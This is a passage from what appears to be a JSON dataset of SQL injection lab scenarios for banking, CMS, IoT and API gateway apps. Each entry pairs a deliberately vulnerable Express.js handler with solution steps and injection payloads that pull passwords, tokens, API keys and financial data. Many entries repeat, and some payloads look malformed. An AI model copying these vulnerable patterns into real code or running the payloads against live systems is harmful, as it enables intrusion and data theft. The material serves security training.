    "srcCode": "app.get('/analytics', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM page_views GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "username, (SELECT password FROM admins)--",
      "page, (SELECT email FROM users)--",
      "referrer, (SELECT session_token FROM sessions)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard's device status report feature allows filtering based on user-defined conditions. The application incorporates user input directly into the HAVING clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to retrieve sensitive device information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send requests to the device status report endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'battery_level > 50 HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--'.",
      "Observe the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of device IDs and secret keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-status', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT device_id, status FROM devices WHERE ${filter} GROUP BY device_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "battery_level > 50 HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--",
      "signal_strength < 30 HAVING 1=1 UNION SELECT device_id, access_token FROM devices--",
      "temperature > 70 HAVING 1=1 UNION SELECT device_id, firmware_version FROM devices--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API gateway's request logging feature allows sorting logs based on user-defined fields. The application directly incorporates user input into the ORDER BY clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to extract sensitive API keys.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the logs endpoint.",
      "Modify the 'sort' parameter to include SQL injection payloads, such as 'timestamp DESC, (SELECT api_key FROM clients LIMIT 1)--'.",
      "Analyze the response for any anomalies or data leakage.",
      "Employ sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of API keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/logs', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM request_logs ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "timestamp DESC, (SELECT api_key FROM clients LIMIT 1)--",
      "endpoint ASC, (SELECT secret FROM tokens LIMIT 1)--",
      "status_code, (SELECT password FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal's account summary feature groups transactions by user-defined criteria. The application incorporates user input directly into the GROUP BY clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to retrieve sensitive financial data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the account summary endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'account_type, (SELECT balance FROM accounts)--'.",
      "Observe the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of account balances."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-summary', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM transactions GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "account_type, (SELECT balance FROM accounts)--",
      "transaction_type, (SELECT credit_limit FROM cards)--",
      "currency, (SELECT interest_rate FROM loans)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in HAVING Clause",
    "Lab Description": "The CMS's content analytics feature allows filtering based on user-defined conditions. The application incorporates user input directly into the HAVING clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to extract sensitive user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests to the content analytics endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'views > 100 HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Analyze the response for any anomalies or data leakage.",
      "Employ sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of usernames and passwords."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/content-analytics', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT content_id, views FROM content WHERE ${filter} GROUP BY content_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "views > 100 HAVING 1=1 UNION SELECT username, password FROM users--",
      "likes < 50 HAVING 1=1 UNION SELECT email, session_token FROM users--",
      "comments > 10 HAVING 1=1 UNION SELECT name, role FROM admins--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal's transaction history feature allows users to sort transactions based on various fields. The application directly incorporates user-supplied input into the ORDER BY clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to retrieve sensitive user information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Modify the 'sort' parameter to include SQL injection payloads, such as 'amount DESC, (SELECT password FROM users LIMIT 1)--'.",
      "Observe the application's response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of user passwords or other sensitive information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount DESC, (SELECT password FROM users LIMIT 1)--",
      "date ASC, (SELECT email FROM users LIMIT 1)--",
      "id, (SELECT credit_card_number FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS's analytics feature groups page views by user-defined criteria. The application incorporates user input directly into the GROUP BY clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to extract administrative user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the analytics endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'username, (SELECT password FROM admins)--'.",
      "Analyze the response for any unusual behavior or data leakage.",
      "Employ sqlmap with appropriate flags to automate the exploitation.",
      "Verify the extraction of administrative user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM page_views GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "username, (SELECT password FROM admins)--",
      "page, (SELECT email FROM users)--",
      "referrer, (SELECT session_token FROM sessions)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard's device status report feature allows filtering based on user-defined conditions. The application incorporates user input directly into the HAVING clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to retrieve sensitive device information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send requests to the device status report endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'battery_level > 50 HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--'.",
      "Observe the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of device IDs and secret keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-status', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT device_id, status FROM devices WHERE ${filter} GROUP BY device_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "battery_level > 50 HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--",
      "signal_strength < 30 HAVING 1=1 UNION SELECT device_id, access_token FROM devices--",
      "temperature > 70 HAVING 1=1 UNION SELECT device_id, firmware_version FROM devices--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API gateway's request logging feature allows sorting logs based on user-defined fields. The application directly incorporates user input into the ORDER BY clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to extract sensitive API keys.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the logs endpoint.",
      "Modify the 'sort' parameter to include SQL injection payloads, such as 'timestamp DESC, (SELECT api_key FROM clients LIMIT 1)--'.",
      "Analyze the response for any anomalies or data leakage.",
      "Employ sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of API keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/logs', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM request_logs ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "timestamp DESC, (SELECT api_key FROM clients LIMIT 1)--",
      "endpoint ASC, (SELECT secret FROM tokens LIMIT 1)--",
      "status_code, (SELECT password FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal's account summary feature groups transactions by user-defined criteria. The application incorporates user input directly into the GROUP BY clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to retrieve sensitive financial data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the account summary endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'account_type, (SELECT balance FROM accounts)--'.",
      "Observe the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of account balances."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-summary', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM transactions GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "account_type, (SELECT balance FROM accounts)--",
      "transaction_type, (SELECT credit_limit FROM cards)--",
      "currency, (SELECT interest_rate FROM loans)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in HAVING Clause",
    "Lab Description": "The CMS's content analytics feature allows filtering based on user-defined conditions. The application incorporates user input directly into the HAVING clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to extract sensitive user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests to the content analytics endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'views > 100 HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Analyze the response for any anomalies or data leakage.",
      "Employ sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of usernames and passwords."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/content-analytics', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT content_id, views FROM content WHERE ${filter} GROUP BY content_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "views > 100 HAVING 1=1 UNION SELECT username, password FROM users--",
      "likes < 50 HAVING 1=1 UNION SELECT email, session_token FROM users--",
      "comments > 10 HAVING 1=1 UNION SELECT name, role FROM admins--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal’s loan approval feature allows users to filter loans based on specific criteria. The application integrates user input into the HAVING clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to extract sensitive loan applicant data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the loan approval filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'amount > 10000 HAVING 1=1 UNION SELECT loan_id, customer_name FROM loan_applications--'.",
      "Check the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and retrieve sensitive loan application details.",
      "Verify the successful extraction of loan applicant data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/loan-approval', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM loans WHERE ${filter} GROUP BY loan_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount > 10000 HAVING 1=1 UNION SELECT loan_id, customer_name FROM loan_applications--",
      "amount < 50000 HAVING 1=1 UNION SELECT loan_id, social_security FROM loan_applications--",
      "status = 'approved' HAVING 1=1 UNION SELECT loan_id, account_balance FROM loan_applications--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in ORDER BY Clause",
    "Lab Description": "The CMS’s article search feature allows users to sort articles based on various criteria. The application includes unsanitized user input directly into the ORDER BY clause, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to extract sensitive article content and user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the article search endpoint.",
      "Inject SQL payloads into the 'sort' parameter, such as 'date DESC, (SELECT password FROM users LIMIT 1)--'.",
      "Analyze the response for any unusual behavior or data leakage.",
      "Utilize sqlmap to automate the exploitation and retrieve sensitive user information.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/articles', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM articles ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "date DESC, (SELECT password FROM users LIMIT 1)--",
      "author ASC, (SELECT email FROM users LIMIT 1)--",
      "title, (SELECT role FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard’s device statistics feature groups devices based on various user-defined criteria. The application improperly integrates user input into the GROUP BY clause, allowing for SQL injection. To solve: Exploit the GROUP BY clause to retrieve sensitive device information and credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device statistics endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'device_type, (SELECT device_id FROM devices LIMIT 1)--'.",
      "Monitor the response for any anomalies or leakage of sensitive data.",
      "Use sqlmap to automate the exploitation and retrieve device-related secrets.",
      "Confirm the retrieval of device IDs and other sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-stats', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM devices GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "device_type, (SELECT device_id FROM devices LIMIT 1)--",
      "manufacturer, (SELECT secret_key FROM devices LIMIT 1)--",
      "location, (SELECT api_token FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "The API gateway exposes a feature that allows users to filter requests based on various criteria. The application improperly integrates user input into the HAVING clause, which allows SQL injection. To solve: Exploit the HAVING clause to retrieve sensitive API credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests to the API logs endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status = 'success' HAVING 1=1 UNION SELECT api_key, client_id FROM api_clients--'.",
      "Examine the response for any signs of data leakage.",
      "Use sqlmap to automate the exploitation and retrieve sensitive API client data.",
      "Verify the successful extraction of API keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-logs', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM api_logs WHERE ${filter} GROUP BY client_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status = 'success' HAVING 1=1 UNION SELECT api_key, client_id FROM api_clients--",
      "endpoint = '/payment' HAVING 1=1 UNION SELECT api_key, client_secret FROM api_clients--",
      "method = 'POST' HAVING 1=1 UNION SELECT api_key, secret_key FROM api_clients--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal’s account search feature allows users to search for accounts based on user-defined parameters. The application integrates user input directly into the HAVING clause without sanitization, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to retrieve sensitive account data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the account search endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'balance > 1000 HAVING 1=1 UNION SELECT account_number, account_holder FROM accounts--'.",
      "Inspect the response for any anomalies or leakage of account data.",
      "Utilize sqlmap to automate the exploitation and retrieve sensitive account details.",
      "Confirm the successful extraction of account numbers and account holders."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-search', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT account_number, balance FROM accounts WHERE ${filter} GROUP BY account_number HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "balance > 1000 HAVING 1=1 UNION SELECT account_number, account_holder FROM accounts--",
      "balance < 50000 HAVING 1=1 UNION SELECT account_number, routing_number FROM accounts--",
      "status = 'active' HAVING 1=1 UNION SELECT account_number, credit_score FROM accounts--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in ORDER BY Clause",
    "Lab Description": "The CMS’s user content filter feature allows users to sort content based on various criteria. The application integrates user input directly into the ORDER BY clause, which leads to SQL injection. To solve: Exploit the ORDER BY clause to extract sensitive user content and administrative data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the content filter endpoint.",
      "Inject SQL payloads into the 'sort' parameter, such as 'created_at DESC, (SELECT email FROM users LIMIT 1)--'.",
      "Analyze the application’s response for any anomalies or data leakage.",
      "Use sqlmap to automate the exploitation and retrieve sensitive user details.",
      "Verify the successful extraction of sensitive user information, including email addresses."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/content', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM content ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "created_at DESC, (SELECT email FROM users LIMIT 1)--",
      "title ASC, (SELECT password FROM users LIMIT 1)--",
      "author, (SELECT role FROM admins LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard allows filtering devices based on user-defined criteria and uses a HAVING clause to refine device data. Improper input handling allows SQL injection in the HAVING clause. To solve: Exploit the HAVING clause to retrieve device secret credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the device filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status = 'online' HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--'.",
      "Observe the response for any anomalies or leakage of sensitive data.",
      "Use sqlmap to automate the exploitation and retrieve device credentials.",
      "Confirm the successful extraction of device IDs and secret keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-filter', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT device_id, status FROM devices WHERE ${filter} GROUP BY device_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status = 'online' HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--",
      "device_type = 'sensor' HAVING 1=1 UNION SELECT device_id, access_token FROM devices"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal’s transaction search feature improperly includes user input into the WHERE clause, allowing for SQL injection. To solve: Inject SQL into the WHERE clause to retrieve sensitive transaction details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction search endpoint.",
      "Inject SQL payloads into the 'transaction_id' parameter, such as '123 OR 1=1--'.",
      "Examine the response for any unexpected data or errors.",
      "Utilize sqlmap to automate the exploitation and extract transaction details.",
      "Verify the successful extraction of transaction information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-search', (req, res) => {\n  const transactionId = req.query.transaction_id;\n  const query = `SELECT * FROM transactions WHERE transaction_id = ${transactionId}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "123 OR 1=1--",
      "456 OR 1=1--",
      "789 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in HAVING Clause",
    "Lab Description": "The CMS’s user filter functionality is vulnerable to SQL injection because it improperly integrates user input into the HAVING clause. To solve: Exploit the HAVING clause to retrieve sensitive user information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the user filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'role = 'admin' HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any anomalies or leaked data.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/user-filter', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM users WHERE ${filter} GROUP BY username HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "role = 'admin' HAVING 1=1 UNION SELECT username, password FROM users--",
      "status = 'active' HAVING 1=1 UNION SELECT username, email FROM users--",
      "type = 'editor' HAVING 1=1 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows users to sort devices by various attributes. The application includes unsanitized user input directly into the ORDER BY clause, allowing for SQL injection. To solve: Exploit the ORDER BY clause to retrieve sensitive device information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device sorting endpoint.",
      "Inject SQL payloads into the 'order' parameter, such as 'device_type ASC, (SELECT serial_number FROM devices LIMIT 1)--'.",
      "Examine the response for any anomalies or sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device credentials.",
      "Verify the successful extraction of sensitive device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-sort', (req, res) => {\n  const order = req.query.order;\n  const query = `SELECT * FROM devices ORDER BY ${order}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "device_type ASC, (SELECT serial_number FROM devices LIMIT 1)--",
      "location DESC, (SELECT ip_address FROM devices LIMIT 1)--",
      "status ASC, (SELECT device_key FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in GROUP BY Clause",
    "Lab Description": "The API gateway allows sorting and grouping of data from various endpoints. Improper handling of user input in the GROUP BY clause creates a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to extract sensitive API credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests to the API data endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'device_id GROUP BY device_type, (SELECT api_key FROM api_clients LIMIT 1)--'.",
      "Observe the response for any data anomalies or leaks.",
      "Use sqlmap to automate the exploitation and retrieve API credentials.",
      "Verify the successful extraction of sensitive API client information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-data', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT * FROM data GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "device_id GROUP BY device_type, (SELECT api_key FROM api_clients LIMIT 1)--",
      "timestamp GROUP BY device_type, (SELECT api_secret FROM api_clients LIMIT 1)--",
      "status GROUP BY device_type, (SELECT api_token FROM api_clients LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in SELECT Clause",
    "Lab Description": "The banking portal’s account balance feature improperly integrates user input into the SELECT clause, allowing for SQL injection. To solve: Exploit the SELECT clause to retrieve sensitive customer information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the account balance endpoint.",
      "Inject SQL payloads into the 'account_id' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Check for any data anomalies or unexpected responses.",
      "Use sqlmap to automate the exploitation and retrieve sensitive user data.",
      "Confirm the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const accountId = req.query.account_id;\n  const query = `SELECT balance FROM accounts WHERE account_id = ${accountId}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT email, role FROM users--",
      "3 UNION SELECT username, secret FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in WHERE Clause",
    "Lab Description": "The CMS’s article search feature includes user input directly into the WHERE clause, making it vulnerable to SQL injection. To solve: Inject SQL into the WHERE clause to retrieve sensitive article and user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the article search endpoint.",
      "Inject SQL payloads into the 'search' parameter, such as 'author = 'admin' AND 1=1 UNION SELECT username, password FROM users--'.",
      "Analyze the response for any data anomalies or leaked information.",
      "Use sqlmap to automate the exploitation and retrieve sensitive user details.",
      "Verify the successful extraction of sensitive user data, including passwords."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/article-search', (req, res) => {\n  const search = req.query.search;\n  const query = `SELECT * FROM articles WHERE author = ${search}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "author = 'admin' AND 1=1 UNION SELECT username, password FROM users--",
      "status = 'published' AND 1=1 UNION SELECT username, email FROM users--",
      "type = 'editor' AND 1=1 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard’s device filter feature improperly uses user input in the HAVING clause, allowing SQL injection. To solve: Exploit the HAVING clause to retrieve sensitive device credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status = 'active' HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--'.",
      "Analyze the response for any anomalies or sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device credentials.",
      "Verify the successful extraction of sensitive device information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-filter', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM devices WHERE ${filter} GROUP BY device_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status = 'active' HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--",
      "device_type = 'sensor' HAVING 1=1 UNION SELECT device_id, api_token FROM devices--",
      "location = 'office' HAVING 1=1 UNION SELECT device_id, access_key FROM devices--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in WHERE Clause",
    "Lab Description": "The API gateway’s query endpoint improperly integrates user input into the WHERE clause, creating an SQL injection vulnerability. To solve: Exploit the WHERE clause to retrieve sensitive API credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send requests to the API query endpoint.",
      "Inject SQL payloads into the 'query' parameter, such as 'status = 'active' AND 1=1 UNION SELECT api_key, api_secret FROM api_clients--'.",
      "Observe the response for any leaked data or errors.",
      "Use sqlmap to automate the exploitation and retrieve sensitive API credentials.",
      "Verify the successful extraction of sensitive API client data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-query', (req, res) => {\n  const query = req.query.query;\n  const sqlQuery = `SELECT * FROM clients WHERE ${query}`;\n  db.query(sqlQuery, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status = 'active' AND 1=1 UNION SELECT api_key, api_secret FROM api_clients--",
      "type = 'premium' AND 1=1 UNION SELECT api_token, api_secret FROM api_clients--",
      "plan = 'basic' AND 1=1 UNION SELECT api_key, api_token FROM api_clients--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal’s transaction sorting feature includes user input in the ORDER BY clause, making it vulnerable to SQL injection. To solve: Exploit the ORDER BY clause to retrieve sensitive transaction data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction sorting endpoint.",
      "Inject SQL payloads into the 'sort' parameter, such as 'amount DESC, (SELECT username FROM users LIMIT 1)--'.",
      "Check for any anomalies or sensitive data leakage in the response.",
      "Use sqlmap to automate the exploitation and retrieve transaction or user data.",
      "Verify the successful extraction of sensitive data."
    ],
